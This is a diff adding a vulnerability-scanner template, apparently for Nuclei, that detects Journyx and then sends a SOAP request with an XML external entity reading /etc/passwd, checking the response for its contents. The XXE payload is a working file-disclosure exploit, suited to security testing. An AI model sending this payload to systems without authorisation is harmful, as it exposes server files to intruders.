@@ -1,0 +1,41 @@
+id: journyx-soap-cgi-pyc-xxe
+info:
+  name: Journyx soap_cgi.pyc XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Journyx"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/jtcgi/soap_cgi.pyc"
+    headers:
+      Content-Type: application/xml
+    body: |-
+      <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><changeUserPassword><username>&test;</username><curpwd>zzz</curpwd><newpwd>zzz123</newpwd></changeUserPassword></soapenv:Body></soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
